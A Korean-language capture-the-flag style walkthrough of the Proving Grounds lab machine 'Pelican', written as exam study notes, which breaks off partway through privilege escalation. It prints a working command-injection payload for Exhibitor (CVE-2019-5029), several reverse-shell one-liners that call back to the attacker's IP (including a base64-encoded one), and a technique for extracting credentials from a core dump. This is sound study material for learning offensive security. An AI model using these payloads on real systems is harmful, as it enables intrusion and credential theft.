---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/web/cmd-injection
  - tech/payload/revshell
  - tech/lin/sudo-abuse
type: machine
platform: pg
os: linux
ip: 192.168.115.98
ports: [22, 139, 445, 631, 2181, 2222, 8080, 8081, 39605]
services: [http, ipp, java-rmi, netbios-ssn, ssh, zookeeper]
cves: [CVE-2019-5029]
status: solved
manual_tags: true
tech_count: 3
---
> [!info] PG Practice — Pelican · Intermediate · Linux (Debian 10, 커널 4.19.0-10-amd64)
> **타겟** 192.168.115.98 · **호스트명** `pelican` · **플래그 2개**
> **경로 요약** 8081 nginx 리다이렉트가 알려준 Exhibitor(ZooKeeper 관리 UI) → 인증 없음 → Config 탭 `java.env script` 필드에 명령 주입(CVE-2019-5029) → `charles` 리버스셸 → `sudo -l`에 `NOPASSWD: /usr/bin/gcore` → root 프로세스 `/usr/bin/password-store`를 코어 덤프 → `strings`로 root 평문 패스워드 → root
> **핵심 교훈** "임의 프로세스의 메모리를 읽을 수 있다"는 것은 곧 root다. 그리고 모르는 포트는 반드시 정체를 밝힌다 — 이 박스의 답은 `2181/zookeeper` 라는 한 줄에서 시작한다.

## 0. 이 박스에서 배우는 것

- **모르는 서비스를 만났을 때의 절차** — `zookeeper`·`Exhibitor`는 시험 준비 과정에서 거의 안 보는 이름이다. 제품명을 확정하는 것 자체가 공격의 90% 였다
- **nmap의 리다이렉트 한 줄이 진입점을 통째로 준다** — `Did not follow redirect to http://…/exhibitor/v1/ui/index.html`. 이 줄을 흘리면 8080은 그냥 404다
- **설정 필드 → 셸 명령 주입(CWE-78)의 전형** — "설정값이 나중에 셸에서 실행된다"는 구조. `$( )`·백틱이 왜 통하는지, `&`가 왜 필요한지
- **`nc -e`는 없을 수도 있다** — 되면 짧고, 안 되면 `mkfifo` 파이프로 간다. 시험장에서 반드시 겪는 갈림길
- **코어 덤프에서 자격증명 뽑기** — `gcore` + `strings`. 프로세스 메모리는 평문 저장소다
- **`sudo -l` 한 줄을 GTFOBins로 번역하는 훈련** — `gcore`는 "셸을 주는" 도구가 아닌데도 root로 가는 길이다. 왜 그런지를 설명할 수 있어야 응용이 된다

> [!tip] 시험 출제 가능성
> | 요소 | 시험 출제 가능성 | 이유 |
> |---|---|---|
> | 관리 UI가 인증 없이 열려 있음 | 매우 높음 | Jenkins·Tomcat manager·phpMyAdmin·Exhibitor·Kibana — 이름만 바뀐다. "관리 화면인데 로그인이 없다"는 그 자체로 취약점이다 |
> | 설정 필드 → 명령 주입 | 높음 | Jenkins 스크립트 콘솔, Nagios 명령 정의, cron 편집 UI, "custom command" 필드. 원리가 전부 같다 |
> | `sudo -l` → GTFOBins | 매우 높음 | 리눅스 권한상승의 첫 명령이자 최빈 경로 |
> | 메모리/코어 덤프에서 크리덴셜 | 중간 | `gcore`·`gdb`·`/proc/PID/mem`·`procdump`. Windows의 LSASS 덤프와 완전히 같은 사고 |
>
> 변형은 이런 모습이다 — Exhibitor 대신 Jenkins `/script`, `java.env` 대신 "build step", `gcore` 대신 `sudo gdb`·`sudo strace`·`SUID python`. 원리는 동일하다.

---

## 1. 정찰

### 1-1. Nmap — 원문

노트 원본에는 별칭 `nnmap 192.168.115.98` 로 기록돼 있다. 실제 실행된 명령은 `nmap.log` 헤더에 남아 있는 아래 형태다:

```bash
┌──(kali㉿kali)-[~/PG/Pelican]
└─$ sudo nmap -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.115.98
# Nmap 7.98 scan initiated Mon Jun 15 10:30:34 2026 as: /usr/lib/nmap/nmap --privileged -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.115.98
Nmap scan report for 192.168.115.98
Host is up (0.067s latency).
Not shown: 65526 closed tcp ports (reset)
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 a8:e1:60:68:be:f5:8e:70:70:54:b4:27:ee:9a:7e:7f (RSA)
|   256 bb:99:9a:45:3f:35:0b:b3:49:e6:cf:11:49:87:8d:94 (ECDSA)
|_  256 f2:eb:fc:45:d7:e9:80:77:66:a3:93:53:de:00:57:9c (ED25519)
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
631/tcp   open  ipp         CUPS 2.2
|_http-server-header: CUPS/2.2 IPP/2.1
|_http-title: Forbidden - CUPS v2.2.10
| http-methods:
|_  Potentially risky methods: PUT
2181/tcp  open  zookeeper   Zookeeper 3.4.6-1569965 (Built on 02/20/2014)
2222/tcp  open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 a8:e1:60:68:be:f5:8e:70:70:54:b4:27:ee:9a:7e:7f (RSA)
|   256 bb:99:9a:45:3f:35:0b:b3:49:e6:cf:11:49:87:8d:94 (ECDSA)
|_  256 f2:eb:fc:45:d7:e9:80:77:66:a3:93:53:de:00:57:9c (ED25519)
8080/tcp  open  http        Jetty 1.0
|_http-server-header: Jetty(1.0)
|_http-title: Error 404 Not Found
8081/tcp  open  http        nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Did not follow redirect to http://192.168.115.98:8080/exhibitor/v1/ui/index.html
39605/tcp open  java-rmi    Java RMI
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: Host: PELICAN; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: pelican
|   NetBIOS computer name: PELICAN\x00
|   Domain name: \x00
|   FQDN: pelican
|_  System time: 2026-06-14T21:31:07-04:00
|_clock-skew: mean: 1h20m00s, deviation: 2h18m34s, median: 0s
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time:
|   date: 2026-06-15T01:31:07
|_  start_date: N/A

TRACEROUTE (using port 1720/tcp)
HOP RTT      ADDRESS
1   66.84 ms 192.168.45.1
2   66.79 ms 192.168.45.254
3   66.94 ms 192.168.251.1
4   67.10 ms 192.168.115.98

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jun 15 10:31:13 2026 -- 1 IP address (1 host up) scanned in 38.40 seconds
```

**플래그 해설**

| 플래그 | 역할 | 빼면 어떻게 되는가 |
|---|---|---|
| `-p-` | 65535 포트 전수 | 필수. 정답 경로인 8081과 대안 경로인 39605(JMX)가 기본 top-1000 밖이다. 8080은 top-1000에 있지만 8080만 보면 404뿐이라 박스가 막힌다 |
| `-sCV` | 기본 NSE + 버전 탐지 | 이 박스의 전부다. `Zookeeper 3.4.6-1569965` 라는 제품·버전과 `Did not follow redirect to …/exhibitor/…` 한 줄이 전부 여기서 나온다. 버전 탐지 없이는 8080/8081이 그냥 "http 두 개"다 |
| `-Pn` | ping 생략 | PG 랩 표준 |
| `-A` | OS 추측 + traceroute + 스크립트 | `smb-os-discovery`로 호스트명 `pelican` 확정. 단 OS 추측 `Linux 5.0 - 5.14`는 오탐이다 (아래) |
| `--min-rate 5000` | 초당 최소 패킷 | 전수 스캔 38초 |

> [!danger] `OS details: Linux 5.0 - 5.14` 는 이 박스에서 실측으로 반증됐다
> 나중에 코어 덤프의 `strings` 출력에 커널이 그대로 찍혔다:
> ```
> LINUX_2.6
> Linux
> 4.19.0-10-amd64
> ```
> 실제 커널은 **4.19.0-10-amd64** (Debian 10 buster). nmap의 `5.0 - 5.14`는 틀렸다.
> [[Sorcerer]]에서도 동일한 배너(`OpenSSH 7.9p1 Debian 10+deb10u2`)에 동일한 오탐이 나왔고, 거기서는 그 오탐을 믿고 5.x 전용 커널 익스플로잇을 컴파일하는 데 시간을 태웠다.
> 커널 버전은 셸을 잡은 뒤 `uname -a`로 확정한다. 누적 패턴 "버전 판정은 독립 근거 2개"([[Hub]] · [[Levram]] · [[RubyDome]] · [[Astronaut]] · [[Squid]]).

**이 스캔에서 읽어야 할 네 줄**

1. **`2181/tcp open zookeeper Zookeeper 3.4.6-1569965 (Built on 02/20/2014)`** — 모르는 제품 + 2014년 빌드. 12년 묵었다. 여기가 본진이라는 신호
2. **`8081 … Did not follow redirect to http://192.168.115.98:8080/exhibitor/v1/ui/index.html`** — 진입 URL을 nmap이 통째로 알려줬다. `exhibitor`라는 제품명까지
3. `8080/tcp open http Jetty 1.0` + `http-title: Error 404 Not Found` — 함정. 루트로 접근하면 404다. 경로를 모르면 여기서 막힌다
4. `39605/tcp open java-rmi Java RMI` — 대안 경로. 나중에 `ps -ef`에서 이 정체가 밝혀진다 (1-4)

> [!warning] 8080의 `Jetty 1.0` 을 제품 버전으로 신뢰하지 마라
> Jetty는 Exhibitor에 내장된 웹서버일 뿐이고, `Server: Jetty(1.0)` 헤더는 실제 Jetty 릴리스 버전과 대응하지 않는다 [가정].
> 제품 정체는 8081의 리다이렉트 경로(`/exhibitor/…`)가 알려줬다. 서버 헤더 하나로 제품을 판정하면 엉뚱한 CVE를 찾게 된다.

### 1-2. 모르는 포트를 만났을 때의 절차

`2181/zookeeper` 는 생소한 이름이었다. 여기서 무엇을 하느냐가 이 박스를 가른다.

> [!tip] 모르는 서비스 대응 순서 — 시험장에서 이대로 한다
> 1. 포트 번호로 검색하지 말고 제품명으로 검색한다. `2181` → 수천 건, `Apache ZooKeeper` → 정확한 문서
> 2. 그 제품의 "관리/웹 UI"가 별도로 있는지 본다. ZooKeeper 자체는 웹 UI가 없고, 관리 UI는 별도 제품(Exhibitor)이다. 관리 UI가 붙어 있으면 거기가 공격면이다
> 3. 배너로 직접 말을 걸어 본다 — ZooKeeper는 4자 명령(four-letter words)을 받는다:
>    ```bash
>    echo srvr  | nc 192.168.115.98 2181   # 버전·모드
>    echo envi  | nc 192.168.115.98 2181   # 환경변수·경로 (정보 유출)
>    echo stat  | nc 192.168.115.98 2181   # 연결 클라이언트
>    echo mntr  | nc 192.168.115.98 2181   # 메트릭
>    ```
>    (3.4.6은 4자 명령에 화이트리스트가 없다. `envi`는 `java.home`·`user.dir` 같은 **경로 정보**를 준다.)
> 4. **검색어 조합**: `<제품명> <버전> exploit`, `<제품명> default credentials`, `<제품명> unauthenticated`
>
> 이 박스는 2번에서 끝났다. **ZooKeeper가 아니라 Exhibitor가 답이다.**

### 1-3. Exhibitor UI — 인증이 없다

8081에 접근하면 `http://192.168.115.98:8080/exhibitor/v1/ui/index.html` 로 리다이렉트되고, 로그인 없이 관리 화면이 바로 뜬다. Config 탭에서 `Editing` 토글을 켜면 설정을 편집할 수 있다:

![[Pasted image 20260615104052.png]]

> [!danger] "로그인 화면이 없다"는 것은 인증이 없다는 뜻이다
> 관리 UI가 로그인을 묻지 않고 열리면 그 순간 미인증 원격 공격자 = 관리자다. 별도의 취약점을 찾기 전에 UI가 제공하는 정상 기능부터 훑어라:
> - 설정 편집(이 박스) · 스크립트 실행 · 플러그인 업로드 · 백업 복원 · 로그 경로 지정 · 명령 정의
>
> Exhibitor는 인증 기능 자체가 없고, 1.7.0 이전에는 바인딩 인터페이스 지정 기능조차 없었다(Talos 공지). 기본 포트는 **8080**이다.

### 1-4. 셸을 잡은 뒤 확인된 것들 (역순 기록)

foothold 이후 `ps -ef`로 확인된, **정찰 단계에서는 몰랐던 사실들**을 여기 모아 둔다:

```
charles  10397  1  4 22:00 ? java -Dzookeeper.log.dir=. -Dzookeeper.root.logger=INFO,CONSOLE
  -cp /opt/zookeeper/bin/../build/classes:...:/opt/zookeeper/zookeeper-3.4.6.jar:...
  -Dcom.sun.management.jmxremote -Dcom.sun.management.jmxremote.local.only=false
  org.apache.zookeeper.server.quorum.QuorumPeerMain /opt/zookeeper/bin/../conf/zoo.cfg
```

- **ZooKeeper는 `charles`로 돈다** → Exhibitor의 명령 주입이 `charles` 셸을 주는 이유
- **`-Dcom.sun.management.jmxremote -Dcom.sun.management.jmxremote.local.only=false`** → nmap이 본 `39605/tcp java-rmi`의 정체다. 인증·TLS 설정 없이 JMX가 원격에 열려 있다 → `mjet`/`MLet` 기반 RCE가 성립할 수 있는 완전히 독립적인 두 번째 foothold [가정 — 시도하지 않았다]

```
root  487  469  0 21:27 ? /bin/sh -c while true; do chown -R charles:charles /opt/zookeeper && chown -R charles:charles /opt/exhibitor && sleep 1; done
root  513    1  0 21:27 ? /usr/bin/password-store
```

- **root가 1초마다 `/opt/zookeeper`·`/opt/exhibitor`를 `charles` 소유로 되돌린다.** 박스 설계상 Exhibitor가 자기 디렉터리를 쓸 수 있게 만든 장치다
- **`/usr/bin/password-store`** — 표준 데비안 패키지에 없는 커스텀 root 프로세스. 이름이 노골적이다. 이게 권한상승의 표적이다

> [!tip] `ps -ef`에서 무엇을 찾는가 — 읽는 순서
> 1. 커스텀 바이너리 — `/usr/bin/password-store` 처럼 배포판에 없는 이름. `dpkg -S /usr/bin/password-store` 로 패키지 소속을 확인하면 즉시 판별된다(어느 패키지에도 없으면 박스 제작자가 심은 것)
> 2. root가 도는 셸 루프/`while true` — cron이나 서비스가 반복 실행하는 스크립트. 그 스크립트나 그것이 만지는 경로에 쓰기 권한이 있으면 권한상승
> 3. JVM 명령줄의 `-D` 플래그 — JMX·디버그 포트(`-agentlib:jdwp`)·크리덴셜이 그대로 노출된다
> 4. 명령줄 인자의 패스워드 — `ps`는 모든 사용자가 볼 수 있다. `--password=` 를 grep 하라
>
> 실전에서는 `ps -ef` 한 번이 아니라 **`pspy`로 지속 관찰**해야 cron이 잡힌다.

---

## 2. 취약점 분석

이 박스는 서로 다른 두 취약점 클래스를 거친다. ① **CWE-78 OS 명령 주입** — 설정값이 나중에 셸에서 확장된다 (foothold). ② **과도한 sudo 권한 위임** — "메모리를 읽는 도구"가 곧 "모든 비밀을 읽는 도구"다 (권한상승). 둘 다 CVE 유무와 무관하게 시험에 나오는 유형이다.

### 2-1. 배경 지식 ① — ZooKeeper와 Exhibitor의 관계

- **Apache ZooKeeper** — 분산 시스템의 설정·리더 선출·잠금을 담당하는 코디네이션 서비스. 클라이언트 포트 **2181**. 자체 웹 UI가 없다
- **Exhibitor** — Netflix가 만든 ZooKeeper 감독(supervisor) + 웹 UI. ZooKeeper 프로세스를 대신 띄우고 내리고, 설정을 편집하고, 백업을 관리한다. 기본 리스너 TCP 8080

이 구조에서 나오는 결론이 중요하다:

> Exhibitor는 "ZooKeeper를 실행하는 주체"다. 그래서 Exhibitor 설정을 바꾸는 것은 곧 "다음에 실행될 명령줄을 바꾸는 것"이다.

관리 UI가 프로세스 기동을 담당하면 **설정 편집 권한 == 코드 실행 권한**이 된다. Jenkins·Nagios·systemd 유닛 편집 UI가 전부 같은 구조다.

### 2-2. CVE-2019-5029 — 1차 사료로 확정된 사실

| 항목 | 값 | 출처 |
|---|---|---|
| CVE | **CVE-2019-5029** | Cisco Talos |
| 공지 번호 | **TALOS-2019-0790** | https://www.talosintelligence.com/vulnerability_reports/TALOS-2019-0790 |
| 분류 | **CWE-78** (Improper Neutralization of Special Elements used in an OS Command) | 위 공지 |
| CVSS 3.0 | **9.8** — `CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` | 위 공지 |
| 영향 범위 | **Exhibitor Web UI 1.0.9 ~ 1.7.1** | 위 공지 |
| 취약 필드 | **Config 탭의 `java.env script`** | 위 공지 |
| 발견자 | Logan Sanderson (Cisco ASIG) | 위 공지 |

**공지 원문:**

> Arbitrary shell commands surrounded by **backticks or `$()`** can be inserted into the editor and will be executed by the Exhibitor process when it launches ZooKeeper.

> [!danger] 이 취약점은 패치가 존재하지 않는다
> soabase/exhibitor 저장소의 상태를 확인하면:
> - 저장소가 **archived** 상태다
> - 마지막 릴리스 태그가 `exhibitor-1.7.1` (2018-07-25) — 공개 시점보다 앞선다. 즉 영향 범위(1.0.9–1.7.1) 밖의 릴리스가 아예 없다
> - 이 취약점을 다룬 이슈 #389 (2019-04-03)는 지금도 열려 있다
> - Talos 타임라인: 2019-03-08 벤더 통보 → 2019-05-01 GitHub 이슈 → 05-14 3차 독촉 → 05-29 최종 통보 → 2019-11-13 무응답 상태로 공개
>
> "업그레이드하세요"가 조치가 아니다. 유일한 완화는 UI를 노출하지 않는 것이다. 방어 관점(8장)에 그대로 반영한다.

### 2-3. 왜 취약한가 — 데이터 흐름

```
[공격자] Exhibitor Web UI · Config 탭 · Editing ON
    │  java.env script 필드에 문자열 입력
    ▼
[Commit] Exhibitor가 새 설정을 저장·배포
    │
    ▼
[Exhibitor] ZooKeeper 기동 — 필드 내용을 **가공 없이** Java 실행 명령줄/기동 스크립트에 전달
    │
    ▼
[셸] 스크립트가 셸에서 평가되며 $( ) · 백틱이 **명령 치환**으로 확장된다
    │
    ▼
[결과] Exhibitor 프로세스 소유자(= charles) 권한으로 임의 명령 실행
```

빠진 것이 무엇인지가 핵심이다 — 입력 검증도, 이스케이프도, 인용도 없다. `java.env`는 원래 JVM 환경변수를 넣으라고 만든 필드이므로 "셸에서 평가될 것"이 설계상 전제인데, 그 필드를 미인증 사용자에게 노출한 것이 취약점이다.

실행 주체를 정확히 이해할 필요가 있다 — 이건 임의 파일 쓰기가 아니라 "ZooKeeper를 기동하는 그 순간, Exhibitor 프로세스 소유자 권한으로 실행"이다. 그래서 얻는 셸은 **root가 아니라 `charles`** 다(1-4에서 확인). 어떤 권한의 셸이 나올지를 미리 예측할 수 있으면 다음 단계 계획이 선다.

### 2-4. 왜 이 페이로드인가 — 조각별 해부

```
$(/bin/nc -e /bin/sh 192.168.45.179 4444 &)
```

| 조각 | 역할 | 빼면 어떻게 되는가 |
|---|---|---|
| `$( … )` | 명령 치환. 셸이 안쪽을 먼저 실행한다 | 없으면 그냥 문자열이다. 백틱`` ` ` ``도 동일하게 동작한다(Talos 공지가 둘 다 명시) |
| `/bin/nc` | 절대 경로 | 기동 스크립트의 `PATH`가 제한적일 수 있다. 절대 경로가 안전하다 |
| `-e /bin/sh` | 연결 후 `/bin/sh`를 소켓에 연결 | 아래 danger 참조 — 없는 netcat이 많다 |
| `192.168.45.179 4444` | 공격자 VPN IP / 리스너 포트 | 랩마다 IP가 바뀐다. `ip a`로 tun0 주소를 확인하고 넣는다 |
| `&` | 백그라운드 실행 | **빼면 명령 치환이 리버스셸 종료까지 블로킹한다.** ZooKeeper 기동이 멈추고, Exhibitor가 기동 실패로 판단해 프로세스를 죽이면 셸도 함께 죽는다 |

> [!danger] `nc -e` 는 대부분의 최신 리눅스에 없다
> 데비안·우분투 기본 패키지인 `netcat-openbsd`에는 `-e` 옵션이 없다. `-e`가 있는 것은 `netcat-traditional`(과 `ncat`)이다.
> 이 박스에서는 통했다 — 즉 타겟에 `netcat-traditional`이 깔려 있었다. **운이 좋았던 것이지 일반 법칙이 아니다.**
> 안 될 때의 대안을 순서대로 외워라:
> ```sh
> # ① mkfifo 파이프 (netcat 버전 무관 — 가장 안정적)
> rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.45.179 4444 > /tmp/f
>
> # ② bash /dev/tcp (bash가 있을 때)
> bash -c 'bash -i >& /dev/tcp/192.168.45.179/4444 0>&1'
>
> # ③ 페이로드가 길거나 인용이 깨질 때 — base64로 감싼다
> echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjE3OS80NDQ0IDA+JjE=' | base64 -d | bash
>
> # ④ 셸 없이 확인만 — 아웃바운드가 되는지부터 검증
> curl http://192.168.45.179:8000/ping   # 칼리에서 python3 -m http.server 8000
> ```
> **누적 패턴 "인용이 깨지면 인코딩으로 도망간다"** ([[Hawat]] hex · [[Exfiltrated]] base64 · [[Squid]] hex+`-enc`+배치래핑).

> [!warning] 리버스셸이 안 붙으면 무엇을 의심하는가
> 1. 아웃바운드 포트 제한 — 4444가 막혔을 수 있다. 80·443으로 바꿔 본다 (거의 항상 열려 있다)
> 2. 리스너 IP — VPN 인터페이스(`tun0`)가 아니라 `eth0` 주소를 넣었을 수 있다
> 3. 리스너가 안 떠 있음 — `nc -lvnp 4444`를 페이로드 전송 전에 띄운다
> 4. `nc -e` 미지원 — 위 danger
> 5. 페이로드가 실행 자체가 안 됨 — `$( )`가 문자열로 저장만 됐거나 트리거(Commit/재기동)가 안 일어난 것
>
> **구분법**: 칼리에서 `sudo tcpdump -i tun0 'tcp port 4444'` 를 걸어 두면 **"패킷이 아예 안 온다"(실행 실패)** 와 **"SYN은 오는데 안 붙는다"(방화벽/리스너 문제)** 를 즉시 구분할 수 있다.

### 2-5. 배경 지식 ② — 왜 코어 덤프에 평문 패스워드가 있는가

**코어 덤프는 프로세스 가상 메모리의 스냅샷**이다. ELF `core` 파일 안에는 그 시점의 힙·스택·데이터 세그먼트·레지스터·환경변수가 **가공 없이** 들어간다.

그래서 이런 것들이 그대로 남는다:

- 프로그램이 문자열로 들고 있는 **패스워드·토큰·키**
- **환경변수 전체** (`HOME=/root`, `PATH=…` — 실제로 이 박스의 덤프에 찍혀 있다)
- 이미 "해제"했다고 믿는 버퍼 (free 해도 메모리는 지워지지 않는다)

이게 Windows의 LSASS 덤프와 완전히 같은 사고다.

| | 리눅스 | 윈도우 |
|---|---|---|
| 표적 | 비밀을 들고 있는 프로세스 | `lsass.exe` |
| 덤프 도구 | `gcore` · `gdb -p` · `/proc/PID/mem` · `procdump` | `procdump -ma` · `comsvcs.dll MiniDump` · Task Manager |
| 추출 | `strings` · `grep` | `mimikatz sekurlsa::minidump` |
| 필요 권한 | root 또는 대상과 같은 uid + ptrace 허용 | `SeDebugPrivilege` |

**"프로세스 메모리를 읽을 수 있다 = 그 프로세스의 모든 비밀을 읽을 수 있다"** — 이 한 문장이 양쪽 OS에 공통이다.

`gcore`가 무엇인가 — GDB에 딸려 오는 셸 스크립트 래퍼다. 내부적으로 대상 PID에 `ptrace`로 붙어 `gcore` 명령을 수행하고 `core.<PID>` 파일을 현재 디렉터리에 만든다.

> [!warning] `gcore` 사용 시 실무적 함정 셋
> 1. 현재 디렉터리에 쓴다. 쓰기 불가 디렉터리에서 실행하면 실패한다 → `cd /tmp` 먼저
> 2. 덤프 크기. 큰 JVM을 덤프하면 수 GB가 나와 디스크가 찬다. `/usr/bin/password-store`처럼 작은 커스텀 바이너리를 노려라
> 3. ptrace 제한. 일반 사용자는 `/proc/sys/kernel/yama/ptrace_scope` 값에 막힐 수 있다. **root(=`sudo`)로 실행하면 이 제한을 넘는다** — 이 박스가 정확히 그 경우다

### 2-6. 왜 `sudo gcore` 하나가 root와 동등한가

```
User charles may run the following commands on pelican:
    (ALL) NOPASSWD: /usr/bin/gcore
```

`gcore`는 셸을 주지 않는다. 파일을 쓰지도 않는다(코어 파일 말고는). 그런데도 **이것은 사실상 root 권한이다:**

1. `(ALL)` — 어떤 사용자로든 실행 가능
2. `NOPASSWD` — `charles`의 패스워드조차 필요 없다
3. `gcore <PID>` 는 **임의 프로세스의 메모리 전체**를 파일로 뽑는다
4. root 프로세스의 메모리에는 **root가 다루는 모든 비밀**이 들어 있다

즉 **"root로 실행되는 도구가 root의 데이터를 건드릴 수 있으면, 그 도구가 셸을 주지 않아도 상관없다."**

> [!tip] `sudo -l` 결과를 읽는 4가지 질문
> 어떤 바이너리가 나오든 이 순서로 판정한다:
> 1. 셸을 직접 주는가? — `vi`·`less`·`man`·`awk`·`find -exec`·`python`·`perl` → GTFOBins의 `sudo` 항목 그대로
> 2. 파일을 쓰는가? — `tee`·`dd`·`cp`·`tar`·`zip` → `/etc/passwd`·`/etc/sudoers`·`~root/.ssh/authorized_keys`·cron 파일
> 3. 파일을 읽는가? — `cat`·`head`·`strings`·`gcore`·`gdb`·`strace`·`tcpdump` → `/etc/shadow`·SSH 개인키·프로세스 메모리
> 4. 다른 프로그램을 실행하는가? — `env`·`nice`·`timeout`·`systemctl`·`start-stop-daemon`([[Sorcerer]])·`git -c core.pager`
>
> `gcore`는 3번이다. "읽기만 되는 원시(primitive)"도 root로 가는 완전한 경로가 된다는 것이 이 박스의 교훈이다.

> [!danger] `sudo -l`에 뭔가 있는데 GTFOBins에 없으면 — 그때가 진짜 시작이다
> GTFOBins에 항목이 있으면 복붙이지만, 없을 때 스스로 판정할 수 있어야 시험에서 산다. 질문은 하나다:
> "이 프로그램이 root로 돌면서, 내가 통제하는 입력이나 내가 읽는 출력으로 무엇이 흘러나오는가?"
> `gcore`의 답 — 입력은 PID(내가 고른다), 출력은 그 프로세스의 메모리 전체(내가 읽는다). 끝났다.

---

## 3. Foothold — Exhibitor 설정 필드 명령 주입

### 3-1. 익스플로잇 확인

![[Pasted image 20260615104131.png]]

> [!warning] `⚠️ 시험 금지 도구` 판정 — 이 박스는 문제없다
> Exhibitor 명령 주입에는 자동 익스플로잇 도구가 필요 없다. 브라우저에서 필드에 문자열을 넣고 Commit을 누르는 것이 전부다.
> `searchsploit exhibitor`로 PoC를 참조하는 것은 허용된다(검색·참조는 금지 대상이 아니다). 금지되는 것은 자동으로 익스플로잇을 수행하는 도구다.
> 완전 수동 대안 — UI 없이 API로 직접 커밋하는 방법도 있다 [가정 — 이 박스에서는 시도하지 않았다]:
> ```bash
> curl -s http://192.168.115.98:8080/exhibitor/v1/config/get-state | jq .   # 현재 설정 확인
> ```
> 브라우저 개발자도구의 Network 탭에서 **Commit이 보내는 요청을 그대로 복사**해 `curl`로 재생하면 UI 없이 재현된다.

### 3-2. 리스너 준비

**페이로드를 넣기 전에** 리스너부터 띄운다:

```bash
┌──(kali㉿kali)-[~/PG/Pelican]
└─$ nc -lvnp 4444
```

| 플래그 | 역할 | 빼면 어떻게 되는가 |
|---|---|---|
| `-l` | 리슨 모드 | — |
| `-v` | 연결 사실을 알려준다 | 붙었는지 모른 채 기다리게 된다 |
| `-n` | DNS 역조회 안 함 | 랩 환경에서 역조회가 수 초씩 지연된다 |
| `-p 4444` | 포트 지정 | — |

> [!tip] 원격 칼리에서 작업한다면 리스너는 반드시 `tmux` 안에서 띄운다
> SSH 세션이 끊기면 리스너가 죽고 셸도 함께 날아간다. 이 볼트의 PG 작업 표준이다:
> ```bash
> tmux new -s pg
> nc -lvnp 4444
> # Ctrl+B, D 로 detach → 나중에 tmux attach -t pg
> ```

### 3-3. 페이로드 주입

Config 탭에서 `Editing`을 켜고 **`java.env script`** 필드에 넣는다:

```
$(/bin/nc -e /bin/sh 192.168.45.179 4444 &)
```

![[Pasted image 20260615104646.png]]

Commit:

![[Pasted image 20260615104628.png]]

### 3-4. RCE 성공 — `charles` 셸

![[Pasted image 20260615104804.png]]

셸을 잡은 직후 **반드시 TTY를 업그레이드한다** (뒤의 `su`가 TTY를 요구한다 — 6장 ④):

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
# Enter 두 번
export TERM=xterm
```

> [!danger] `nc -e` 로 얻은 셸은 TTY가 아니다
> 증상: `su`가 `su: must be run from a terminal` 로 거부 · `sudo`가 패스워드를 못 받음 · `vi`/`top`이 깨짐 · `Ctrl+C`가 셸 자체를 죽임 · 탭 완성·히스토리 없음.
> `python3`이 없으면 대안: `script -qc /bin/bash /dev/null` · `perl -e 'exec "/bin/bash";'` · `socat`(양쪽에 설치 시).

---

## 4. 권한상승

### 4-1. 셸을 잡자마자 치는 5개

```bash
id
sudo -l
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
cat /etc/crontab; ls -la /etc/cron.d/
```

**이 박스는 2번에서 끝났다:**

```bash
sudo -l
Matching Defaults entries for charles on pelican:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User charles may run the following commands on pelican:
    (ALL) NOPASSWD: /usr/bin/gcore
```

위쪽 `Defaults` 줄도 읽을 가치가 있다. `env_reset`은 sudo 실행 시 환경변수를 초기화한다 — 즉 `LD_PRELOAD`·`PYTHONPATH` 류의 환경변수 공격이 막혀 있다. `secure_path=…`는 sudo가 쓰는 `PATH`를 고정한다 — PATH 하이재킹도 막혀 있다. 이 두 줄이 없으면 훨씬 쉬운 길이 열렸을 것이다. `sudo -l`은 "무엇이 되는가"뿐 아니라 "무엇이 막혀 있는가"도 알려준다.

### 4-2. 표적 선정 — `ps -ef`

```bash
ps -ef | grep -i 'root'
```

커널 스레드(`[kworker]`·`[rcu_*]` 등)를 걷어내고 나면 **눈에 띄는 것은 둘**이다:

```
root  487  469  0 21:27 ? 00:00:00 /bin/sh -c while true; do chown -R charles:charles /opt/zookeeper && chown -R charles:charles /opt/exhibitor && sleep 1; done
root  513    1  0 21:27 ? 00:00:00 /usr/bin/password-store
```

> [!note]- 전체 `ps -ef | grep -i 'root'` 원문 (접힘 — 클릭해서 펼친다)
> ```bash
> ps -ef | grep -i 'root'
> root         1     0  0 21:27 ?        00:00:00 /sbin/init
> root         2     0  0 21:27 ?        00:00:00 [kthreadd]
> root         3     2  0 21:27 ?        00:00:00 [rcu_gp]
> root         4     2  0 21:27 ?        00:00:00 [rcu_par_gp]
> root         6     2  0 21:27 ?        00:00:00 [kworker/0:0H-kblockd]
> root         7     2  0 21:27 ?        00:00:00 [kworker/u2:0-events_unbound]
> root         8     2  0 21:27 ?        00:00:00 [mm_percpu_wq]
> root         9     2  0 21:27 ?        00:00:00 [ksoftirqd/0]
